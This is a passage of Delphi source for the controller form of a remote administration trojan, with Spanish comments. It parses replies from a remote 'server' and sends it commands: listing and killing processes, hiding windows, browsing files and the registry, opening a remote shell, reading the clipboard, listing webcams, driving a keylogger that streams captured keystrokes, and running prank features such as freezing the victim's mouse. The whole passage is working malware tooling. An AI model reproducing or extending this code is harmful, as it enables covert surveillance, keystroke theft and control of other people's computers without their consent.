    Listviewprocesos.items.beginupdate;
    Delete(Recibido, 1, 5);
    while pos('|', Recibido) > 0 do
    begin
      Item := ListViewProcesos.Items.Add;
      Item.ImageIndex := 3; //imagen para que quede bonito XD
      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
      TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
      //De la ruta de los procesos quitamos \??\ y sustituimos \SystemRoot\ por %windir%\
      TempStr := StringReplace(TempStr, '\??\', '', [rfReplaceAll]);
      if Copy(TempStr, 1, 12) = '\SystemRoot\' then
        TempStr := StringReplace(TempStr, '\SystemRoot\', '%windir%\', [rfReplaceAll]);
      Item.SubItems.Add(TempStr);
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    listviewprocesos.items.endupdate;
    listviewprocesos.Width := listviewprocesos.Width+1;     //Para que desaparezca la scrollbar horizontal
    listviewprocesos.Width := listviewprocesos.Width-1;
    BtnRefrescarProcesos.Enabled := true;

  end;
  //Listar Ventanas
  if Copy(Recibido, 1, 4) = 'WIND' then
  begin
    ListViewVentanas.Clear;
    Listviewventanas.Items.BeginUpdate;
    Delete(Recibido, 1, 5);
    while pos('|', Recibido) > 0 do
    begin
      Item := ListViewVentanas.Items.Add;
      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);        //titulo
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));     //handle
      Delete(Recibido, 1, Pos('|', Recibido));

      
      case strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),4) of
      0: begin item.ImageIndex := 65; Item.SubItems.Add(_('Oculta')); end;
      1: begin item.ImageIndex := 61; Item.SubItems.Add(_('Maximizada')); end;
      2: begin item.ImageIndex := 66; Item.SubItems.Add(_('Normal')); end;
      3: begin item.ImageIndex := 64; Item.SubItems.Add(_('Minimizada')); end;
      4: begin item.ImageIndex := 66; Item.SubItems.Add(_('Activa')); end;
      end;

      Delete(Recibido, 1, Pos('|', Recibido));
    end;
      Listviewventanas.Items.EndUpdate;
      Listviewventanas.Width := Listviewventanas.Width+1;     //Para que desaparezca la scrollbar horizontal
      Listviewventanas.Width := Listviewventanas.Width-1;
      BtnRefrescarVentanas.Enabled := true;
  end;

  //Ir a proceso...
  //Sintaxis: WINPROC|HandleDeLaVentana|PIDDelProcesoDueñoDeLaVentana
  if Copy(Recibido, 1, 7) = 'WINPROC' then
  begin
    Delete(Recibido, 1, 8);
    //Mete en TempStr la handle
    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    Delete(Recibido, 1, Pos('|', Recibido));
    if ListViewProcesos.Items.Count <= 0 then
      MessageBox(Handle,
        pchar(_('No se encontró ningún proceso listado. Debes actualizar la lista de procesos.')),
        'Error', MB_ICONERROR + MB_OK);
    if Recibido = '0' then
    begin
      MessageBox(Handle,
        pchar(_('No se encontró ningún proceso para la ventana. Es posible que el proceso ya haya sido cerrado.')
        +
        #13#10 + _('Actualice la lista de ventanas.')), 'Error', MB_ICONERROR + MB_OK);
    end
    else
      for i := 0 to ListViewProcesos.Items.Count - 1 do
      begin
        if ListViewProcesos.Items[i].SubItems[0] = Recibido then
        begin
          StatusBar.Panels[1].Text :=
            _('La ventana con handle ') + TempStr + _(' pertenece al proceso "') +
            ListViewProcesos.Items[i].Caption + _('" con PID ') + Recibido + '.';
          ListViewProcesos.Items[i].MakeVisible({PartialVisible->}False);
          //Falso para asegurarse que se vea completamente el item
          PageControl.ActivePageIndex := TabProcesos.TabIndex;
          ListViewProcesos.SetFocus;
          ListViewProcesos.Items[i].Focused  := True;
          ListViewProcesos.Items[i].Selected := True;
          //Para que aparezca automaticamente seleccionado en la ventana

          Break;
        end;
      end;
  end;

  //Mostrar Mensaje en la StatusBar
  if Copy(Recibido, 1, 3) = 'MSG' then
  begin
    Delete(Recibido, 1, 4);
    for i := 0 to 54 do
      Recibido := StringReplace(Recibido,'{'+inttostr(i)+'}',MSGPosibles[i],[rfReplaceAll]);

    if Recibido = _('El directorio no existe!') then
    begin
      EditPathArchivos.Text :=
        Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
      EditPathArchivos.Text :=
        Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
    end;
    StatusBar.Panels[1].Text := Recibido;
    MessageBeep($FFFFFFFF);
    //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
  end;

  if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
  begin
    Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la string
    ListViewBromas.Items[0].SubItems[0] := Recibido;
    //0 porque es el primero en la ListViewBromas
  end;
  if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
  begin
    Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la string
    ListViewBromas.Items[1].SubItems[0] := Recibido;
  end;
  if Copy(Recibido, 1, 7) = 'ABRIRCD' then
  begin
    Delete(Recibido, 1, 8); //Borra ''ABRIRCD|' de la string
    ListViewBromas.Items[2].SubItems[0] := Recibido;
  end;
  if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
  begin
    Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la string
    ListViewBromas.Items[3].SubItems[0] := Recibido;
  end;

  if Copy(Recibido, 1, 11) = 'VERUNIDADES' then
  begin
    Delete(Recibido, 1, 12); //Borra 'VERUNIDADES|' de la string
    cmbUnidades.Items.Clear;
    while Pos('|', Recibido) > 1 do
      //Mayor que 1 porque hay un '|' al final de la cadena que se desprecia
    begin
      TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));  //Unidad
      Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
      TempStr := TempStr + ' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));  //Nombre
      Delete(Recibido, 1, Pos('|', Recibido));

      TempStr := TempStr + ' - '+_('Espacio libre/total: ') +
        ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
      //Espacio disponible
      Delete(Recibido, 1, Pos('|', Recibido));
      TempStr := TempStr + ' / ' +
        ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
      //Espacio total
      Delete(Recibido, 1, Pos('|', Recibido));
      TempStr := TempStr + ' - '+_('Formato:')+' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));
      //Formato
      Delete(Recibido, 1, Pos('|', Recibido));
      case StrToInt(Copy(Recibido, 1, (Pos('|', Recibido) - 1))) of //el último caracter
        0: TempStr := TempStr + _(' - Unidad desconocida');
        2: TempStr := TempStr + _(' - Unidad removible');
        3: TempStr := TempStr + _(' - Disco duro');
        4: TempStr := TempStr + _(' - Disco de red');
        5: TempStr := TempStr + _(' - Unidad de CD/DVD');
        6: TempStr := TempStr + _(' - Disc RAM');
      end;
      cmbUnidades.Items.Add(TempStr);
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    cmbUnidades.Enabled      := True;
    EditPathArchivos.Enabled := True;
    BtnActualizarArchivos.Enabled := True;
    StatusBar.Panels[1].Text := _('Unidades listadas.');
    BtnVerUnidades.Enabled := True;
  end;

  if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
  begin
    Delete(Recibido, 1, 15); //Borra 'LISTARARCHIVOS|'
    //cargar iconos
    
    if Pos('|', Recibido) > 1 then
    begin
      TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      //Saca la longitud de la cadena
      Delete(Recibido, 1, Pos('|', Recibido)); //Borra la longitud
    end;
    while Length(Recibido) < StrToInt(TempStr) do
      //mientras el length de la cadena sea menor a lo que nos dice el server
      Recibido := Recibido + Trim(Athread.Connection.ReadLn);

    ListViewArchivos.Items.BeginUpdate;
    ListViewArchivos.Clear; //Limpia primero...
    if Length(EditPathArchivos.Text) > 3 then
    begin
      Item := ListViewArchivos.Items.Add;
      Item.ImageIndex := 3;
      Item.Caption := '<..>';
    end;
    
    while Pos('|', Recibido) > 1 do
    begin
      TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
      if TempStr[1] = #2 then //entonces le llegó una carpeta
      begin
        Delete(TempStr, 1, 1); //borra el #2
        Item := ListViewArchivos.Items.Add;
        Item.ImageIndex := 3; //1 es el icono de carpeta cerrada
        Item.Caption := Copy(TempStr, 1, Pos(':', TempStr) - 1);
        Delete(TempStr, 1, Pos(':', Tempstr));

        Item.SubItems.Add('');
        Item.SubItems.Add(_('Carpeta de archivos'));
        Item.SubItems.Add(Copy(TempStr, 1, Pos(':', TempStr) - 1));
        Item.SubItems.Add(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)));
      end
      else //entonces es un archivo, saque tambien la información extra...
      begin
        Item    := ListViewArchivos.Items.Add;
        Item.ImageIndex := IconNum(LowerCase(ExtractFileExt(TempStr)));
        Item.Caption := TempStr;

        if((AnsiLowerCase(tempstr) = 'thumbs.db') and PrevisualizacionActiva and not receivingthumbfile) then
        begin
          Receivingthumbfile := true;
          Servidor.Connection.Writeln('GETFILE|'+EditPathArchivos.text+tempstr);
        end;

        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(ObtenerMejorUnidad(StrToInt(TempStr)));
        RealSize := TempStr;
        TempStr  := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(TempStr); //agrega el tipo
        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(TempStr); //agrega atributos
        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(TempStr); //agrega la fecha
        Item.SubItems.Add(RealSize);
      end;
    end;
    if ListViewArchivos.Items.Count > 0 then
    begin
      //Aquí cuenta las carpetas para decir cuantas son
      a := 0;
      for i := 0 to ListViewArchivos.Items.Count - 1 do
      begin
        if ListViewArchivos.Items[i].ImageIndex = 3 then
          a := a + 1;
      end;
      LabelNumeroDeCarpetas.Caption := _('Carpetas: ') + IntToStr(a);
      //Aquí cuenta los archivos para decir cuantos son
      a := 0;
      for i := 0 to ListViewArchivos.Items.Count - 1 do
      begin
        if (ListViewArchivos.Items[i].ImageIndex <> 3) then //si no es una carpeta...
          a := a + 1;
      end;
      LabelNumeroDeArchivos.Caption := _('Archivos: ') + IntToStr(a);
    end;
    if PrevisualizacionActiva then
      cargariconos(false);
    ListViewArchivos.Items.EndUpdate;
    listviewarchivos.Width := listviewarchivos.Width+1;     //Para que desaparezca la scrollbar horizontal
    listviewarchivos.Width := listviewarchivos.Width-1;
    BtnActualizarArchivos.enabled := true;
  end;

  if Copy(Recibido, 1, 9) = 'GETFOLDER' then
  begin
    Delete(Recibido, 1, 9);
    while pos('|', Recibido) > 0 do
    begin
       Tempstr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
       Delete(Recibido, 1, Pos('|', Recibido));
       agregardescargaencola(TempStr, strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0));
       Delete(Recibido, 1, Pos('|', Recibido));
    end;
  end;

  if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
  begin
    Delete(Recibido, 1, 13);
   { if Pos('|', Recibido) > 1 then
    begin
      TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
    end;       }
   { while length(Recibido) < StrToInt(TempStr) do
    begin
      Recibido := Recibido + Trim(Athread.Connection.ReadLn);
    end;     }
    AniadirClavesARegistro(Recibido);
  end;
  if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
  begin
    Delete(Recibido, 1, 14);
    AniadirValoresARegistro(Recibido);
    Recibido := '';
    BtnVerRegisto.enabled := true;
  end;
  if Copy(Recibido, 1, 13) = 'LISTARWEBCAMS' then
  begin
    Delete(Recibido, 1, 14);
    ComboBoxWebcam.Clear;
    while Pos('|', Recibido) > 0 do
    begin
      ComboBoxWebcam.Items.Append(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    StatusBar.Panels[1].Text := _('Webcams listadas.');
  end;

  if Pos('SHELL|', Recibido) = 1 then
  begin
    Delete(Recibido, 1, 6);
    if Recibido = 'ACTIVAR' then
    begin
      TabShell.Highlighted := true;
      MemoShell.Color      := ClBlack;
      MemoShell.Font.Color := clWhite;
      ComboBoxShellCommand.Color := ClBlack;
      ComboBoxshellCommand.Font.Color := clWhite;
      ComboBoxShellCommand.Enabled := True;
      {btnCambiarColorShell.Enabled := True;
      btnCambiarFuenteShell.Enabled := True;  }
    end
    else
    if Recibido = 'DESACTIVAR' then
    begin
      //exit;
      TabShell.Highlighted := false;
      MemoShell.Color      := ClInactiveBorder;
      MemoShell.Font.Color := clWhite;
      ComboBoxShellCommand.Color := ClInactiveBorder;
      ComboBoxshellCommand.Font.Color := clWhite;
      ComboBoxShellCommand.Enabled := False;
      {btnCambiarColorShell.Enabled := False;     //Ni idea porque pero suelta error "controlador no valido": Me parece que el thread de los sockets tiene problemas al desactivar speedbuttons
      btnCambiarFuenteShell.Enabled := False;  }
    end
    else
    begin
     TempStr := StringReplace(Trim(Recibido),'|salto|', #10, [rfReplaceAll]);
     TempStr := StringReplace((Tempstr),'|salto2|', #13, [rfReplaceAll]);

      MemoShell.Text := MemoShell.Text + Trim(Tempstr) + #13#10;
      SendMessage(MemoShell.Handle, EM_LINESCROLL, 0, length(TempStr));
    end;
  end;

  if Copy(Recibido, 1, 12) = 'SERVICIOSWIN' then
  begin
    Delete(Recibido, 1, 14); //es 14 porque los datos recibidos se inicia con un /
    // ejemplo : /alerter/alvg*..
    listviewservicios.Items.BeginUpdate;
    while pos('|', Recibido) > 0 do
    begin
      Item := listviewservicios.Items.Add;
      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(copy(recibido, 1, pos('|', Recibido) - 1));
      if(copy(recibido, 1, pos('|', Recibido) - 1) = _('Parado')) then
        item.ImageIndex := 69
      else
      if(copy(recibido, 1, pos('|', Recibido) - 1) = _('Corriendo')) then
        item.ImageIndex := 71
      else
      if(copy(recibido, 1, pos('|', Recibido) - 1) = _('Pausado')) then
        item.ImageIndex := 70
      else
        item.ImageIndex := 45;
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    listviewservicios.Items.EndUpdate;
    listviewservicios.Width := listviewservicios.Width-1;//Para eliminar la scrollvar horizontal
    listviewservicios.Width := listviewservicios.Width+1;
    BtnServicios.enabled := true;
  end;

   if Copy(Recibido, 1, 15) = 'ESTADOKEYLOGGER' then
  begin
    Delete(Recibido, 1, Pos('|', Recibido));
    if(copy(Recibido, 1, pos('|', Recibido) - 1) = 'ACTIVADO') then
    begin

      SpeedButtonRecibirLog.Enabled := true;
      SpeedButtonGuardarLog.Enabled := true;
      SpeedButtonEliminarLog.Enabled := true;
      ProgressBarKeylogger.Enabled := true;
      EditLogName.Enabled := false;
      SpeedButtonActivarKeylogger.caption := _('Desactivar Keylogger');
      SpeedButtonActivarKeylogger.enabled := true;
      CheckBoxOnlineKeylogger.enabled := true;
    end
    else
    begin
      SpeedButtonRecibirLog.Enabled := false;
      SpeedButtonGuardarLog.Enabled := false;
      SpeedButtonEliminarLog.Enabled := false;
      ProgressBarKeylogger.Enabled := false;
      EditLogName.Enabled := true;
      SpeedButtonActivarKeylogger.caption := _('Activar Keylogger');
      SpeedButtonActivarKeylogger.enabled := true;
      CheckBoxOnlineKeylogger.enabled := false;
    end;
    Delete(Recibido, 1, Pos('|', Recibido));
    if(copy(Recibido, 1, pos('|', Recibido) - 1)<>'') then
      EditLogName.Text := Extractfilename(copy(Recibido, 1, pos('|', Recibido) - 1));
  end;

  if Copy(Recibido, 1, 13) = 'NEWKEYLOGKEYS' then
  begin
    Delete(Recibido, 1, Pos('|', Recibido));
    Recibido := StringReplace((Recibido),'|salto|', #10, [rfReplaceAll]);
    Recibido := StringReplace((Recibido),'|salto2|', #13, [rfReplaceAll]);
    Recibido := StringReplace((Recibido),'|espacio|', ' ', [rfReplaceAll]); 
    RichEditKeylogger.SelStart := RichEditKeylogger.GetTextLen;
    
    while pos(#10, Recibido) > 0 do
    begin
      TempStr := copy(Recibido, 1, pos(#10, Recibido));
      Delete(Recibido, 1, Pos(#10, Recibido));
      
      if (Copy(TempStr, 1, 2) = '-[') then //evento
      begin
         RichEditKeylogger.SelAttributes.Style := [fsBold];
         RichEditKeylogger.SelAttributes.Color := clRed;
      end
      else if (Copy(TempStr, 1, 2) = '-{') then
      begin
         RichEditKeylogger.SelAttributes.Style := [fsBold];
         RichEditKeylogger.SelAttributes.Color := clgreen;
      end
      else
      begin
         RichEditKeylogger.SelAttributes.Style := [];
         RichEditKeylogger.SelAttributes.Color := clblack;
      end;
        RichEditKeylogger.SelText := TempStr {+ #13+#10};

    end;
    RichEditKeylogger.SelText := Recibido;
  end;

  if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
  begin
    Delete(Recibido, 1, Pos('|', Recibido));
    AnchuraPantalla := strtoint(copy(Recibido, 1, pos('|', Recibido) - 1));
    Delete(Recibido, 1, Pos('|', Recibido));
    AlturaPantalla := strtoint(copy(Recibido, 1, pos('|', Recibido) - 1));
  end;

  if Copy(Recibido, 1, 6) = 'SEARCH' then
  begin
    Delete(Recibido, 1, Pos('|', Recibido));
    if copy(Recibido,1,5) = 'STOPS' then     //Paramos...
    begin
      TabSheetBuscar.highlighted := false;
      SpeedButtonBuscar.caption := _('Comenzar');
      EditBuscar.Enabled := true;
      StatusBar.panels[1].text := _('Busqueda parada');
    end
    else if  copy(Recibido,1,6) = 'FINISH' then //Terminado!
    begin
      SpeedButtonBuscar.caption := _('Comenzar');
      EditBuscar.Enabled := true;
      StatusBar.panels[1].text := _('Busqueda finalizada');
      TabSheetBuscar.highlighted := false; 
    end
    else
    begin
      while pos('|', Recibido) > 0 do
      begin
        item := ListViewBuscar.items.add;
        item.caption := copy(Recibido, 1, pos('|',Recibido)-1);
        item.ImageIndex := Iconnum(LowerCase(ExtractFileExt(item.caption)));
        delete(Recibido,1,pos('|',Recibido));
        RealSize := copy(Recibido, 1, pos('|',Recibido)-1);
        item.SubItems.Add(ObtenerMejorUnidad(strtoint(copy(Recibido, 1, pos('|',Recibido)-1))));  //tamano
        delete(Recibido,1,pos('|',Recibido));
        item.SubItems.Add(copy(Recibido, 1, pos('|',Recibido)-1));
        item.SubItems.Add('');//noatributos
        delete(Recibido,1,pos('|',Recibido));
        item.SubItems.Add(copy(Recibido, 1, pos('|',Recibido)-1));
        delete(Recibido,1,pos('|',Recibido));
        Item.SubItems.Add(RealSize);
      end;//fin while
      
      LabelNumeroEncontrados.Caption := _('Encontrados: ')+inttostr(ListViewBuscar.items.count);
   end;
  end;

  if Copy(Recibido, 1, 6) = 'GORUTA' then
  begin
    Delete(Recibido, 1, Pos('|', Recibido));
    EditPathArchivos.Text := copy(Recibido, 1, pos('|', Recibido) - 1);
    BtnActualizarArchivos.Click;
  end;

  // Portapapeles!
  If Copy(Recibido,1,7) = 'GETCLIP' then
  begin
       Delete(Recibido,1,8);
       MemoClipBoard.Text:= Recibido;
  end;

// se fini del dispacher de comandos
end;

function TFormControl.IconNum(strExt: string): integer;
var
  FileInfo : SHFILEINFO;
begin
 { if (strExt = '.mp3') or (strExt = '.wav') or (strExt = '.ogg') or
    (strExt = '.midi') or (strExt = '.mid') or (strExt = '.cda') then
    Result := 25
  else if (strExt = '.avi') or (strExt = '.mpg') or (strExt = '.mpeg') or
    (strExt = '.asf') or (strExt = '.wmv') or (strExt = '.mov') then
    Result := 25
  else if (strExt = '.jpg') or (strExt = '.jpeg') or (strExt = '.gif') or
    (strExt = '.png') or (strExt = '.pdf') then
    Result := 23
  else if (strExt = '.dll') or (strExt = '.sys') or (strExt = '.ocx') or
    (strExt = '.vxd') or (strExt = '.cpl') or (strExt = '.ini') then
    Result := 24
  else if (strExt = '.txt') then
    Result := 6
  else if (strExt = '.html') or (strExt = '.htm') or (strExt = '.php') then
    Result := 9
  else if (strExt = '.exe') or (strExt = '.com') or (strExt = '.scr') then
    Result := 3
  else if (strExt = '.bat') or (strExt = '.cmd') then
    Result := 10
  else if (strExt = '.zip') or (strExt = '.rar') or (strExt = '.ace') then
    Result := 11
  else if (strExt = '.doc') or (strExt = '.rtf') then
    Result := 12
  else if (strExt = '.ppt') or (strExt = '.pps') then
    Result := 13
  else if (strExt = '.xls') or (strExt = '.xml') then
    Result := 14
  else if (strExt = '.bmp') or (strExt = '.ico') then
    Result := 26
  else
    Result := 2;        }
  SHGetFileInfo(PChar(UpperCase(ExtractFileExt(strext))),
                    FILE_ATTRIBUTE_NORMAL,
                    FileInfo,
                    SizeOf(FileInfo),
                    SHGFI_ICON  or
                    SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
  Result := FileInfo.iIcon;
end;

//Boton obtener información
procedure TFormControl.BtnRefrescarInformacionClick(Sender: TObject);
begin
  if not BtnRefrescarInformacion.Enabled then exit;
  BtnRefrescarInformacion.Enabled := false;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('INFO')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Boton obtener procesos
procedure TFormControl.BtnRefrescarProcesosClick(Sender: TObject);
begin
  if not BtnRefrescarProcesos.Enabled then exit;
  BtnRefrescarProcesos.Enabled := false;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('PROC')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Item del popupmenu para cerrar un proceso
procedure TFormControl.Cerrar1Click(Sender: TObject);
begin
 mslistviewitem := ListViewProcesos.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg(_('Selecciona algún proceso para matar'), mtWarning, [mbOK], 0)
    else
    begin

      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewProcesos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;

    end
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);




end;

//Boton obtener ventanas
procedure TFormControl.BtnRefrescarVentanasClick(Sender: TObject);
begin
  if not BtnRefrescarVentanas.Enabled then exit;

  BtnRefrescarVentanas.Enabled := false;
  if Servidor.Connection.Connected then
  begin
    if(CheckBoxMostrarVentanasOcultas.Checked) then
      Servidor.Connection.Writeln('WIND|true|')
    else
      Servidor.Connection.Writeln('WIND|false|');
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Item del popupmenu para cerrar una ventana
procedure TFormControl.Cerrar2Click(Sender: TObject);
begin
  mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Item del popupmenu para maximizar una ventana
procedure TFormControl.Maximizar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('MAXWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);

end;

//Item del popupmenu para minimizar una ventana
procedure TFormControl.Minimizar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('MINWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Item del popupmenu para mostrar una ventana
procedure TFormControl.Mostrar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('SHOWWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Item del popupmenu para ocultar una ventana
procedure TFormControl.Ocultar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('HIDEWIN|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Item del popupmenu para minimizar todas las ventanas
procedure TFormControl.Minimizartodas1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('MINALLWIN')
  else
    MessageDlg(Pchar(_('No estás conectado!')), mtWarning, [mbOK], 0);
end;

//Activar Botón cerrar [X] de una ventana
procedure TFormControl.Activar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('BOTONCERRAR|SI|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Desactivar Botón cerrar [X] de una ventana
procedure TFormControl.Desactivar1Click(Sender: TObject);
begin
mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
  begin
    if mslistviewitem = nil then
      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
    else
    begin
      while Assigned(mslistviewitem) do
      begin
       Servidor.Connection.Writeln('BOTONCERRAR|NO|' + mslistviewitem.SubItems[0]);
       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
      end;
      end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;


procedure TFormControl.BtnEnviarBromasClick(Sender: TObject);
var
  broma: string;
begin
  if Servidor.Connection.Connected then
  begin
    if ListViewBromas.Selected = nil then
      MessageDlg(_('Selecciona alguna broma'), mtWarning, [mbOK], 0)
    else
    begin
      case ListViewBromas.Selected.Index of //Selecciona la broma que se va a enviar
        0: Broma := 'MOUSETEMBLOROSO';
        1: Broma := 'CONGELARMOUSE';
        2: Broma := 'ABRIRCD';
        3: Broma := 'MATARBOTONINICIO';
      end;
      if ListViewBromas.Selected.SubItems[0] = _('Desactivado') then
      begin
        Servidor.Connection.Writeln(Broma + '|ACTIVAR');
        if Broma = 'MOUSETEMBLOROSO' then
          ListViewBromas.Items[1].SubItems[0] := _('Desactivado');
        // El mouse se descongela si se activa el congela mouse
        if Broma = 'CONGELARMOUSE' then
          ListViewBromas.Items[0].SubItems[0] := _('Desactivado');
        //El mouse para de temblar si se congela
      end
      else  //Si esta activada
        Servidor.Connection.Writeln(Broma + '|DESACTIVAR');
    end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

//Funciones del FileManager
procedure TFormControl.BtnVerUnidadesClick(Sender: TObject);
begin
  BtnVerUnidades.Enabled := false;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('VERUNIDADES')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.cmbUnidadesSelect(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    Servidor.Connection.Writeln('LISTARARCHIVOS|' + Copy(cmbUnidades.Text, 1, 3));
